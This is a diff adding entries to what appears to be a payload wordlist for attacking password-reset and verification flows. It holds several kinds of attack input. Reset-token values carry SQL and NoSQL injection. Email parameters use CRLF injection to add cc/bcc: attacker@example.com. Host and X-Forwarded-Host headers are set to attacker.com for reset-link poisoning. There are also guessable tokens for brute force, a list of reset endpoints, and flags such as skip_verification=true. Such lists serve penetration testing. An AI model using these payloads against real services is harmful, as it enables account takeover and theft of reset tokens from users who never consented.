@@ -119,6 +119,50 @@ token=&email=attacker@example.com
 token=0
 token=null
 token=false
+token=undefined
+token=%20
+token=true
+email[]=victim@example.com&email[]=attacker@example.com
+email=victim@example.com%0Acc:attacker@example.com
+email=victim@example.com%0Abcc:attacker@example.com
+
+# Password reset token manipulation
+reset_token=' OR '1'='1
+reset_token={"$gt": ""}
+reset_token=*
+reset_token=admin'--
+user_id=1&token=valid_token
+user_id=999&token=valid_token
+
+# Host header injection for password reset poisoning
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+
+# Password reset without verification
+new_password=Pass123&confirm_password=Pass123
+# (without providing reset token or current password)
+
+# Password reset endpoint enumeration
+POST /api/password/reset
+POST /api/v1/auth/password-reset
+POST /password-reset
+POST /forgot-password
+POST /reset-password
+PUT /api/users/password
+PATCH /account/password
+
+# Weak token brute force
+token=000000
+token=111111
+token=123456
+token=0000
+token=1234
+
+# Bypass email verification in reset
+email_verified=true
+verified=true
+skip_verification=true
 
 # OTP/2FA bypass
 otp=000000
